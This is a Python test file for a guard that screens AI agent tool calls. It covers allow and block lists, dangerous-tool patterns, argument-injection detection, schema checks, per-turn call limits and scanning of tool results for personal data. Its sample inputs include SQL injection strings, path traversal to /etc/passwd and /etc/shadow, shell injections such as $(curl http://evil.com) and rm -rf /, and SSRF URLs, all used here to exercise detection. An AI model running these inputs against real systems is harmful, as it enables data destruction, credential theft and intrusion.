"""Tests for tool guard module."""
from __future__ import annotations

from launchpromptly._internal.tool_guard import (
    ToolCallInfo,
    ToolGuardOptions,
    check_tool_calls,
    detect_dangerous_args,
    scan_tool_result,
)


# ── Whitelist / Blacklist ────────────────────────────────────────────────────


def test_allows_tool_in_allowed_tools():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{"q": "test"}')],
        ToolGuardOptions(allowed_tools=["search", "calculator"]),
    )
    assert result.blocked is False
    assert len(result.violations) == 0


def test_blocks_tool_not_in_allowed_tools():
    result = check_tool_calls(
        [ToolCallInfo(name="delete_file", arguments='{"path": "/tmp/data"}')],
        ToolGuardOptions(allowed_tools=["search", "calculator"]),
    )
    assert result.blocked is True
    assert result.violations[0].type == "unlisted_tool"
    assert result.violations[0].tool_name == "delete_file"


def test_blocks_tool_in_blocked_tools():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments='{}')],
        ToolGuardOptions(blocked_tools=["exec", "shell"]),
    )
    assert result.blocked is True
    assert result.violations[0].type == "blocked_tool"


def test_allows_tool_not_in_blocked_tools():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{}')],
        ToolGuardOptions(blocked_tools=["exec", "shell"]),
    )
    assert result.blocked is False


def test_empty_allowed_tools_blocks_all():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{}')],
        ToolGuardOptions(allowed_tools=[]),
    )
    assert result.blocked is True
    assert result.violations[0].type == "unlisted_tool"


def test_empty_blocked_tools_allows_all():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments='{}')],
        ToolGuardOptions(blocked_tools=[]),
    )
    # Not blocked by blacklist (but may be flagged as dangerous tool)
    blocked_violations = [v for v in result.violations if v.type == "blocked_tool"]
    assert len(blocked_violations) == 0


def test_case_insensitive_tool_matching():
    result = check_tool_calls(
        [ToolCallInfo(name="Search", arguments='{}')],
        ToolGuardOptions(allowed_tools=["search"]),
    )
    assert result.blocked is False


def test_wildcard_in_allowed_tools():
    result = check_tool_calls(
        [ToolCallInfo(name="search_web", arguments='{}')],
        ToolGuardOptions(allowed_tools=["search_*"]),
    )
    assert result.blocked is False


def test_wildcard_blocks_non_matching():
    result = check_tool_calls(
        [ToolCallInfo(name="delete_file", arguments='{}')],
        ToolGuardOptions(allowed_tools=["search_*"]),
    )
    assert result.blocked is True


def test_multiple_calls_blocks_if_any_blocked():
    result = check_tool_calls(
        [
            ToolCallInfo(name="search", arguments='{}'),
            ToolCallInfo(name="exec", arguments='{}'),
        ],
        ToolGuardOptions(allowed_tools=["search"]),
    )
    assert result.blocked is True


def test_multiple_calls_allows_if_all_allowed():
    result = check_tool_calls(
        [
            ToolCallInfo(name="search", arguments='{}'),
            ToolCallInfo(name="calculator", arguments='{}'),
        ],
        ToolGuardOptions(allowed_tools=["search", "calculator"]),
    )
    assert result.blocked is False


def test_no_config_allows_everything():
    result = check_tool_calls(
        [ToolCallInfo(name="anything", arguments='{}')],
        ToolGuardOptions(),
    )
    # No whitelist/blacklist violations
    wl_bl = [v for v in result.violations if v.type in ("unlisted_tool", "blocked_tool")]
    assert len(wl_bl) == 0


# ── Dangerous tool patterns ─────────────────────────────────────────────────


def test_detects_exec_as_dangerous():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments='{}')],
        ToolGuardOptions(),
    )
    assert any(v.type == "dangerous_tool" for v in result.violations)


def test_detects_shell_command_as_dangerous():
    result = check_tool_calls(
        [ToolCallInfo(name="shell_command", arguments='{}')],
        ToolGuardOptions(),
    )
    # shell matches the exec/shell pattern
    assert any(v.type == "dangerous_tool" for v in result.violations)


def test_detects_file_write_as_dangerous():
    result = check_tool_calls(
        [ToolCallInfo(name="file_write", arguments='{}')],
        ToolGuardOptions(),
    )
    assert any(v.type == "dangerous_tool" for v in result.violations)


def test_detects_send_email_as_dangerous():
    result = check_tool_calls(
        [ToolCallInfo(name="send_email", arguments='{}')],
        ToolGuardOptions(),
    )
    assert any(v.type == "dangerous_tool" for v in result.violations)


def test_allows_search_not_dangerous():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{}')],
        ToolGuardOptions(),
    )
    dangerous = [v for v in result.violations if v.type == "dangerous_tool"]
    assert len(dangerous) == 0


def test_allows_calculator_not_dangerous():
    result = check_tool_calls(
        [ToolCallInfo(name="calculator", arguments='{}')],
        ToolGuardOptions(),
    )
    dangerous = [v for v in result.violations if v.type == "dangerous_tool"]
    assert len(dangerous) == 0


def test_custom_patterns_override_defaults():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments='{}')],
        ToolGuardOptions(dangerous_tool_patterns=["my_custom_*"]),
    )
    dangerous = [v for v in result.violations if v.type == "dangerous_tool"]
    assert len(dangerous) == 0  # exec not in custom patterns


def test_case_insensitive_dangerous_patterns():
    result = check_tool_calls(
        [ToolCallInfo(name="EXEC", arguments='{}')],
        ToolGuardOptions(),
    )
    assert any(v.type == "dangerous_tool" for v in result.violations)


# ── Dangerous arg detection ──────────────────────────────────────────────────


def test_detects_sql_injection_or_1_equals_1():
    result = check_tool_calls(
        [ToolCallInfo(name="db_query", arguments='{"sql": "SELECT * FROM users WHERE 1=1 OR id=1"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert result.blocked is True
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_sql_injection_drop_table():
    result = check_tool_calls(
        [ToolCallInfo(name="db_query", arguments="'; DROP TABLE users; --")],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_sql_injection_union_select():
    result = check_tool_calls(
        [ToolCallInfo(name="db_query", arguments="UNION SELECT password FROM credentials")],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_path_traversal():
    result = check_tool_calls(
        [ToolCallInfo(name="read_file", arguments='{"path": "../../etc/passwd"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert result.blocked is True
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_path_traversal_encoded():
    result = check_tool_calls(
        [ToolCallInfo(name="read_file", arguments='{"path": "%2e%2e%2f%2e%2e%2fetc/passwd"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_shell_injection_subshell():
    result = check_tool_calls(
        [ToolCallInfo(name="run", arguments='$(curl http://evil.com)')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_shell_injection_backticks():
    result = check_tool_calls(
        [ToolCallInfo(name="run", arguments='`rm -rf /`')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_shell_injection_semicolon():
    result = check_tool_calls(
        [ToolCallInfo(name="run", arguments='; cat /etc/shadow')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_ssrf_metadata():
    result = check_tool_calls(
        [ToolCallInfo(name="fetch", arguments='{"url": "http://169.254.169.254/latest/meta-data"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_ssrf_localhost():
    result = check_tool_calls(
        [ToolCallInfo(name="fetch", arguments='{"url": "http://localhost:3000/admin"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_detects_ssrf_127():
    result = check_tool_calls(
        [ToolCallInfo(name="fetch", arguments='{"url": "http://127.0.0.1:8080/internal"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert any(v.type == "dangerous_args" for v in result.violations)


def test_allows_normal_query_args():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{"query": "weather in Tokyo"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    assert result.blocked is False


def test_allows_normal_url_args():
    result = check_tool_calls(
        [ToolCallInfo(name="fetch", arguments='{"url": "https://api.example.com/search?q=test"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    dangerous = [v for v in result.violations if v.type == "dangerous_args"]
    assert len(dangerous) == 0


def test_allows_normal_file_path():
    result = check_tool_calls(
        [ToolCallInfo(name="read", arguments='{"path": "/home/user/documents/report.pdf"}')],
        ToolGuardOptions(dangerous_arg_detection=True),
    )
    dangerous = [v for v in result.violations if v.type == "dangerous_args"]
    assert len(dangerous) == 0


# ── Schema validation ────────────────────────────────────────────────────────


def test_valid_args_pass_schema():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{"query": "test", "limit": 10}')],
        ToolGuardOptions(
            parameter_schemas={
                "search": {
                    "type": "object",
                    "properties": {"query": {"type": "string"}, "limit": {"type": "number"}},
                    "required": ["query"],
                }
            }
        ),
    )
    schema_violations = [v for v in result.violations if v.type == "invalid_args"]
    assert len(schema_violations) == 0


def test_wrong_type_fails_schema():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{"query": 123}')],
        ToolGuardOptions(
            parameter_schemas={
                "search": {
                    "type": "object",
                    "properties": {"query": {"type": "string"}},
                    "required": ["query"],
                }
            }
        ),
    )
    assert any(v.type == "invalid_args" for v in result.violations)


def test_missing_required_fails_schema():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{"limit": 10}')],
        ToolGuardOptions(
            parameter_schemas={
                "search": {
                    "type": "object",
                    "properties": {"query": {"type": "string"}},
                    "required": ["query"],
                }
            }
        ),
    )
    assert any(v.type == "invalid_args" for v in result.violations)


def test_no_schema_skips_validation():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments='{"anything": "goes"}')],
        ToolGuardOptions(parameter_schemas={"other_tool": {"type": "object"}}),
    )
    schema_violations = [v for v in result.violations if v.type == "invalid_args"]
    assert len(schema_violations) == 0


def test_malformed_json_returns_violation():
    result = check_tool_calls(
        [ToolCallInfo(name="search", arguments="not valid json{")],
        ToolGuardOptions(parameter_schemas={"search": {"type": "object"}}),
    )
    assert any(v.type == "invalid_args" for v in result.violations)


# ── Turn limits ──────────────────────────────────────────────────────────────


def test_allows_n_calls_when_limit_is_n():
    result = check_tool_calls(
        [ToolCallInfo(name="a", arguments="{}"), ToolCallInfo(name="b", arguments="{}")],
        ToolGuardOptions(max_tool_calls_per_turn=2),
    )
    turn_violations = [v for v in result.violations if v.type == "turn_limit"]
    assert len(turn_violations) == 0


def test_blocks_over_max_calls():
    result = check_tool_calls(
        [ToolCallInfo(name="a", arguments="{}"), ToolCallInfo(name="b", arguments="{}"), ToolCallInfo(name="c", arguments="{}")],
        ToolGuardOptions(max_tool_calls_per_turn=2),
    )
    assert any(v.type == "turn_limit" for v in result.violations)


def test_max_calls_1_allows_single():
    result = check_tool_calls(
        [ToolCallInfo(name="a", arguments="{}")],
        ToolGuardOptions(max_tool_calls_per_turn=1),
    )
    turn_violations = [v for v in result.violations if v.type == "turn_limit"]
    assert len(turn_violations) == 0


def test_max_calls_0_blocks_all():
    result = check_tool_calls(
        [ToolCallInfo(name="a", arguments="{}")],
        ToolGuardOptions(max_tool_calls_per_turn=0),
    )
    assert any(v.type == "turn_limit" for v in result.violations)


def test_no_max_calls_allows_unlimited():
    result = check_tool_calls(
        [ToolCallInfo(name=f"t{i}", arguments="{}") for i in range(20)],
        ToolGuardOptions(),
    )
    turn_violations = [v for v in result.violations if v.type == "turn_limit"]
    assert len(turn_violations) == 0


# ── Tool result scanning ────────────────────────────────────────────────────


def test_detects_ssn_in_tool_result():
    report = scan_tool_result(
        "lookup_user",
        "User found: John Smith, SSN: 123-45-6789, email: john@example.com",
    )
    assert any(t.type == "pii" and t.pii_type == "ssn" for t in report.threats)


def test_detects_email_in_tool_result():
    report = scan_tool_result(
        "lookup_user",
        "Contact: john.doe@example.com",
    )
    assert any(t.type == "pii" and t.pii_type == "email" for t in report.threats)


def test_clean_tool_result_passes():
    report = scan_tool_result(
        "weather",
        "The weather in Tokyo is 22°C and sunny.",
    )
    assert report.clean is True
    assert len(report.threats) == 0


def test_tool_result_returns_tool_name():
    report = scan_tool_result(
        "my_tool",
        "SSN: 123-45-6789",
    )
    assert report.tool_name == "my_tool"


# ── Action modes ─────────────────────────────────────────────────────────────


def test_action_block_blocks():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments="{}")],
        ToolGuardOptions(blocked_tools=["exec"], action="block"),
    )
    assert result.blocked is True


def test_action_warn_does_not_block():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments="{}")],
        ToolGuardOptions(blocked_tools=["exec"], action="warn"),
    )
    assert result.blocked is False
    assert len(result.violations) > 0


def test_action_flag_does_not_block():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments="{}")],
        ToolGuardOptions(blocked_tools=["exec"], action="flag"),
    )
    assert result.blocked is False


def test_default_action_is_block():
    result = check_tool_calls(
        [ToolCallInfo(name="exec", arguments="{}")],
        ToolGuardOptions(blocked_tools=["exec"]),
    )
    assert result.blocked is True


# ── detect_dangerous_args standalone ─────────────────────────────────────────


def test_detect_dangerous_args_sql():
    results = detect_dangerous_args("SELECT * FROM users WHERE 1=1 OR id=1")
    categories = [r["category"] for r in results]
    assert "sql_injection" in categories


def test_detect_dangerous_args_path_traversal():
    results = detect_dangerous_args("../../etc/passwd")
    categories = [r["category"] for r in results]
    assert "path_traversal" in categories


def test_detect_dangerous_args_clean():
    results = detect_dangerous_args("Hello world, this is a normal query")
    assert len(results) == 0
